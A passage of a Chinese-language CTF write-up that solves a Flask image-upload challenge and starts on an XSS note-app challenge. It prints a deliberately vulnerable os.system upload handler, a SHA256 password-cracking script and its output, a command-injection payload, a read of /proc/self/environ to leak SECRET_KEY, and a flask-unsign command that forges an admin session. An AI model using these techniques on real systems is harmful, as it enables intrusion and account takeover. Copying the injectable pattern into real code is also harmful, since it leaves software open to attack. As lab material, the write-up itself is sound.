&lt;h1&gt;Login&lt;/h1&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        &lt;h2&gt;No need to register.&lt;/h2&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        &lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">            &lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">            &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">            &lt;br&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">            &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">            &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">            &lt;br&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">            &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        &lt;/form&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span><br><br><br><span class="hljs-comment"># 上传路由：处理文件上传和展示</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><br>defupload():<br><br>    <span class="hljs-comment"># 未登录用户重定向到登录页</span><br><br>    ifnot session.get(<span class="hljs-string">&#x27;username&#x27;</span>):<br><br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br>  <br><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br><br>        <span class="hljs-comment"># 获取上传的文件对象</span><br><br>        f = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br><br>        <span class="hljs-comment"># 生成唯一文件名：UUID + 原始文件名，防止覆盖</span><br><br>        file_path = <span class="hljs-built_in">str</span>(uuid.uuid4()) + <span class="hljs-string">&#x27;_&#x27;</span> + f.filename<br><br>        <span class="hljs-comment"># 保存文件到 ./uploads/ 目录（需确保该目录存在！）</span><br><br>        f.save(<span class="hljs-string">&#x27;./uploads/&#x27;</span> + file_path)<br><br>        <span class="hljs-comment"># 重定向到 GET 请求，附带 file_path 参数用于显示图像</span><br><br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">f&#x27;/upload?file_path=<span class="hljs-subst">&#123;file_path&#125;</span>&#x27;</span>)<br><br>  <br><br>    <span class="hljs-keyword">else</span>:  <span class="hljs-comment"># GET 请求</span><br><br>        ifnot request.args.get(<span class="hljs-string">&#x27;file_path&#x27;</span>):<br><br>            <span class="hljs-comment"># 未提供 file_path：显示上传表单</span><br><br>            <span class="hljs-keyword">return</span><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">            &lt;h1&gt;Upload Image&lt;/h1&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">            &lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                &lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">            &lt;/form&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">            &#x27;&#x27;&#x27;</span><br><br>        <span class="hljs-keyword">else</span>:<br><br>            <span class="hljs-comment"># 已提供 file_path：尝试显示图像</span><br><br>            file_path = <span class="hljs-string">&#x27;./uploads/&#x27;</span> + request.args.get(<span class="hljs-string">&#x27;file_path&#x27;</span>)<br><br>          <br><br>            <span class="hljs-comment"># 普通用户（非 admin）：直接读取文件并 Base64 编码后嵌入 &lt;img&gt; 标签显示</span><br><br>            <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span>:<br><br>                withopen(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br><br>                    content = f.read()<br><br>                    b64 = base64.b64encode(content)<br><br>                    <span class="hljs-keyword">return</span><span class="hljs-string">f&#x27;&lt;img src=&quot;data:image/png;base64,<span class="hljs-subst">&#123;b64.decode()&#125;</span>&quot; alt=&quot;Uploaded Image&quot;&gt;&#x27;</span><br><br>            <span class="hljs-keyword">else</span>:<br><br>                <span class="hljs-comment"># admin 用户：执行系统命令将文件转为 Base64 并保存到 /tmp/</span><br><br>                <span class="hljs-comment"># ⚠️ 严重安全漏洞：file_path 来自用户输入，未做任何过滤，可导致命令注入！</span><br><br>                os.system(<span class="hljs-string">f&#x27;base64 <span class="hljs-subst">&#123;file_path&#125;</span> &gt; /tmp/<span class="hljs-subst">&#123;file_path&#125;</span>.b64&#x27;</span>)<br><br>              <br><br>                <span class="hljs-comment"># 注释掉的代码本意是读取 Base64 内容并显示图像</span><br><br>                <span class="hljs-comment"># 但实际返回的是固定字符串，阻止 admin 查看图像</span><br><br>                <span class="hljs-keyword">return</span><span class="hljs-string">&#x27;Sorry, but you are not allowed to view this image.&#x27;</span><br><br><br><span class="hljs-comment"># 启动应用（仅在直接运行脚本时生效）</span><br><br>if__name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)  <span class="hljs-comment"># 监听所有接口，端口 5000</span><br><br></code></pre></td></tr></table></figure><p>官方wp有两种解法，一是构造session，二是爆破admin密码哈希值</p><p>爆破脚本：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs py"><br><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-keyword">import</span> itertools<br><br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-keyword">import</span> argparse<br><br><span class="hljs-keyword">import</span> sys<br><br><br>defsha256_hash(text):<br><br>    <span class="hljs-keyword">return</span> hashlib.sha256(text.encode()).hexdigest()<br><br><br>defdictionary_attack(hash_target, wordlist_file):<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 启动字典攻击，使用字典: <span class="hljs-subst">&#123;wordlist_file&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">try</span>:<br><br>        withopen(wordlist_file, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>) <span class="hljs-keyword">as</span> f:<br><br>            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br><br>                word = line.strip()<br><br>                ifnot word:<br><br>                    <span class="hljs-keyword">continue</span><br><br>                <span class="hljs-keyword">if</span> sha256_hash(word) == hash_target:<br><br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[✅] 找到明文! 哈希: <span class="hljs-subst">&#123;hash_target&#125;</span> =&gt; 明文: &#x27;<span class="hljs-subst">&#123;word&#125;</span>&#x27;&quot;</span>)<br><br>                    <span class="hljs-keyword">return</span> word<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] 字典攻击失败，未找到匹配项。&quot;</span>)<br><br>    exceptFileNotFoundError:<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] 错误：字典文件 &#x27;<span class="hljs-subst">&#123;wordlist_file&#125;</span>&#x27; 不存在。&quot;</span>)<br><br>    returnNone<br><br><br>defbrute_force_attack(hash_target, charset, min_length=<span class="hljs-number">1</span>, max_length=<span class="hljs-number">6</span>):<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 启动暴力破解 (长度 <span class="hljs-subst">&#123;min_length&#125;</span>-<span class="hljs-subst">&#123;max_length&#125;</span>)，字符集: <span class="hljs-subst">&#123;charset&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">for</span> length inrange(min_length, max_length + <span class="hljs-number">1</span>):<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  尝试长度: <span class="hljs-subst">&#123;length&#125;</span>&quot;</span>)<br><br>        <span class="hljs-keyword">for</span> attempt <span class="hljs-keyword">in</span> itertools.product(charset, repeat=length):<br><br>            word = <span class="hljs-string">&#x27;&#x27;</span>.join(attempt)<br><br>            <span class="hljs-keyword">if</span> sha256_hash(word) == hash_target:<br><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[✅] 找到明文! 哈希: <span class="hljs-subst">&#123;hash_target&#125;</span> =&gt; 明文: &#x27;<span class="hljs-subst">&#123;word&#125;</span>&#x27;&quot;</span>)<br><br>                <span class="hljs-keyword">return</span> word<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] 暴力破解失败，未在指定范围内找到匹配项。&quot;</span>)<br><br>    returnNone<br><br><br>defmain():<br><br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&quot;SHA256 哈希爆破工具&quot;</span>)<br><br>    parser.add_argument(<span class="hljs-string">&#x27;hash&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;目标 SHA256 哈希值（十六进制）&quot;</span>)<br><br>    parser.add_argument(<span class="hljs-string">&#x27;-w&#x27;</span>, <span class="hljs-string">&#x27;--wordlist&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;字典文件路径（用于字典攻击）&quot;</span>)<br><br>    parser.add_argument(<span class="hljs-string">&#x27;-b&#x27;</span>, <span class="hljs-string">&#x27;--bruteforce&#x27;</span>, action=<span class="hljs-string">&#x27;store_true&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;启用暴力破解模式&quot;</span>)<br><br>    parser.add_argument(<span class="hljs-string">&#x27;--charset&#x27;</span>, default=string.ascii_letters + string.digits,<br><br>                        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;暴力破解字符集（默认: a-zA-Z0-9）&quot;</span>)<br><br>    parser.add_argument(<span class="hljs-string">&#x27;--min&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>, default=<span class="hljs-number">1</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;暴力破解最小长度（默认: 1）&quot;</span>)<br><br>    parser.add_argument(<span class="hljs-string">&#x27;--max&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>, default=<span class="hljs-number">6</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;暴力破解最大长度（默认: 6）&quot;</span>)<br><br><br>    args = parser.parse_args()<br><br><br>    target_hash = args.<span class="hljs-built_in">hash</span>.lower()<br><br>    iflen(target_hash) != <span class="hljs-number">64</span>:<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!] 错误：SHA256 哈希应为 64 位十六进制字符串。&quot;</span>)<br><br>        sys.exit(<span class="hljs-number">1</span>)<br><br><br>    <span class="hljs-comment"># 优先尝试字典攻击</span><br><br>    <span class="hljs-keyword">if</span> args.wordlist:<br><br>        result = dictionary_attack(target_hash, args.wordlist)<br><br>        <span class="hljs-keyword">if</span> result:<br><br>            <span class="hljs-keyword">return</span><br><br><br>    <span class="hljs-comment"># 如果启用或字典失败，尝试暴力破解</span><br><br>    <span class="hljs-keyword">if</span> args.bruteforce:<br><br>        brute_force_attack(target_hash, args.charset, args.<span class="hljs-built_in">min</span>, args.<span class="hljs-built_in">max</span>)<br><br>    <span class="hljs-keyword">else</span>:<br><br>        ifnot args.wordlist:<br><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!] 请提供 -w 字典文件 或 -b 启用暴力破解。&quot;</span>)<br><br><br>if__name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    main()<br><br></code></pre></td></tr></table></figure><p>也可以用bp，配合rockyou几乎秒出。。。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br><span class="hljs-selector-attr">[+]</span> 启动字典攻击，使用字典: rockyou<span class="hljs-selector-class">.txt</span><br><br><span class="hljs-selector-attr">[✅]</span> 找到明文! 哈希: <span class="hljs-number">32783</span>cef30bc23d9549623aa48aa8556346d78bd3ca604f277d63d6e573e8ce0 =&gt; 明文: <span class="hljs-string">&#x27;backdoor&#x27;</span><br><br></code></pre></td></tr></table></figure><p>拿到admin后可以执行命令：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs py"><br>os.system(<span class="hljs-string">f&#x27;base64 <span class="hljs-subst">&#123;file_path&#125;</span> &gt; /tmp/<span class="hljs-subst">&#123;file_path&#125;</span>.b64&#x27;</span>)<br><br>而：<br><br>file_path = <span class="hljs-string">&#x27;./uploads/&#x27;</span> + request.args.get(<span class="hljs-string">&#x27;file_path&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>如此时file_path传入：aaa.png;ls &#x2F; &gt; .&#x2F;upload&#x2F;ls.txt</p><p>拼接后为：</p><p>base64 aaa.png;ls &#x2F; &gt; .&#x2F;upload&#x2F;ls.txt &gt; &#x2F;tmp&#x2F;aaa.png;ls &#x2F; &gt; .&#x2F;upload&#x2F;ls.txt.b64</p><p>前面的命令段：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>base64aaa.png;  <br><br><span class="hljs-built_in">ls</span>/ &gt; ./upload/ls.txt &gt; /tmp/aaa.png;  <br><br><span class="hljs-built_in">ls</span>/ &gt; ./upload/ls.txt.b64   <span class="hljs-comment">#(我们期望的是这条命令)</span><br><br></code></pre></td></tr></table></figure><p>实现 rce</p><p>试一下方法二：</p><p>通过读取系统变量来查看secret_key来构建session</p><p>注意到 <code>secretkey</code> 是从环境变量中读取，所以可以读 <code>/proc/self/environ</code> 进而伪造 <code>session</code></p><p>问题来了:</p><p>为什么知道是这个路径？</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs tcl"><br>一、为什么是 /<span class="hljs-keyword">proc</span>/self/environ？<br><br>1. /<span class="hljs-keyword">proc</span> 是<span class="hljs-title"> Linux</span> 的虚拟文件系统<br><br>它不真实存在于磁盘，而是由内核动态生成，反映当前系统运行状态。<br><br>每个运行中的进程在 /<span class="hljs-keyword">proc</span> 下都有一个以其<span class="hljs-title"> PID（进程</span> ID） 命名的目录，如 /<span class="hljs-keyword">proc</span>/1234/。<br><br>2. /<span class="hljs-keyword">proc</span>/&lt;pid&gt;/environ 是什么？<br><br>它是 进程启动时的环境变量快照，格式为<span class="hljs-title"> KEY=VALUE\0KEY2=VALUE2\0...（用空字符</span> \0 分隔）。<br><br>只有进程所有者或<span class="hljs-title"> root</span> 可读。<br><br>3.<span class="hljs-title"> self</span> 是什么？<br><br>/<span class="hljs-keyword">proc</span>/self 是一个符号链接，永远指向 当前进程的<span class="hljs-title"> PID</span> 目录。<br><br></code></pre></td></tr></table></figure><p>读取到变量：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><br><span class="hljs-attr">SECRET_KEY</span>=S3cRetK3y<br><br></code></pre></td></tr></table></figure><p>拿到了flask session的SECRET_KEY，就可以伪造任意用户了</p><p>然后了解到有快速伪造工具</p><p>pip install flash-unsign</p><p>flask-unsign –sign –cookie “{‘username’: ‘admin’}” –secret “S3cRetK3y”</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br>eyJ1c2VybmFtZSI6ImFkbWluIn0<span class="hljs-selector-class">.aOAhNA</span><span class="hljs-selector-class">.cocF_px315Fb69Br7utkzicyWLQ</span><br><br></code></pre></td></tr></table></figure><p>拿到session</p><h2 id="eznote"><a href="#eznote" class="headerlink" title="eznote"></a>eznote</h2><p>一个博客系统，那应该就是xss加bot访问拿信息或cookie</p><p>先让ai注释一下源码：</p><p>app:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br></pre></td><td class="code"><pre><code class="hljs js"><br><span class="hljs-comment">// 引入必要的模块</span><br><br>constexpress = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)                    <span class="hljs-comment">// Express Web 框架</span><br><br>constsession = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-session&#x27;</span>)            <span class="hljs-comment">// 用于管理用户会话</span><br><br><span class="hljs-keyword">const</span> &#123; randomBytes &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>)            <span class="hljs-comment">// 用于生成随机字节（如会话密钥、文件名等）</span><br><br>constfs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)                              <span class="hljs-comment">// 文件系统操作</span><br><br>constspawn = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>)                <span class="hljs-comment">// 用于执行外部命令（如 pandoc）</span><br><br>constpath = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>)                          <span class="hljs-comment">// 路径处理工具</span><br><br><span class="hljs-keyword">const</span> &#123; visit &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./bot&#x27;</span>)                    <span class="hljs-comment">// 自定义模块，模拟机器人访问 URL</span><br><br>constcreateDOMPurify = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;dompurify&#x27;</span>);         <span class="hljs-comment">// 用于清理 HTML，防止 XSS</span><br><br><span class="hljs-keyword">const</span> &#123; <span class="hljs-variable constant_">JSDOM</span> &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsdom&#x27;</span>);                   <span class="hljs-comment">// 在 Node.js 中模拟浏览器 DOM 环境</span><br><br><br><span class="hljs-comment">// 初始化 DOMPurify（用于 HTML 净化）</span><br><br>constDOMPurify = <span class="hljs-title function_">createDOMPurify</span>(<span class="hljs-title function_">newJSDOM</span>(<span class="hljs-string">&#x27;&#x27;</span>).<span class="hljs-property">window</span>);<br><br><br><span class="hljs-comment">// 服务器监听配置</span><br><br>constLISTEN_PORT = <span class="hljs-number">3000</span><br><br>constLISTEN_HOST = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>  <span class="hljs-comment">// 允许外部访问</span><br><br><br><span class="hljs-comment">// 创建 Express 应用实例</span><br><br>constapp = <span class="hljs-title function_">express</span>()<br><br><br><span class="hljs-comment">// 设置模板引擎：使用 EJS 渲染 .html 文件</span><br><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, <span class="hljs-string">&#x27;./views&#x27;</span>)                    <span class="hljs-comment">// 模板文件目录</span><br><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;html&#x27;</span>)                 <span class="hljs-comment">// 默认模板后缀</span><br><br>app.<span class="hljs-title function_">engine</span>(<span class="hljs-string">&#x27;html&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;ejs&#x27;</span>).<span class="hljs-property">renderFile</span>)  <span class="hljs-comment">// 使用 EJS 渲染 HTML 模板</span><br><br><br><span class="hljs-comment">// 解析 POST 表单中的 URL 编码数据</span><br><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>:<span class="hljs-literal">true</span> &#125;))<br><br><br><span class="hljs-comment">// 配置会话中间件</span><br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">session</span>(&#123;<br><br>    <span class="hljs-attr">secret</span>:<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">4</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>),   <span class="hljs-comment">// 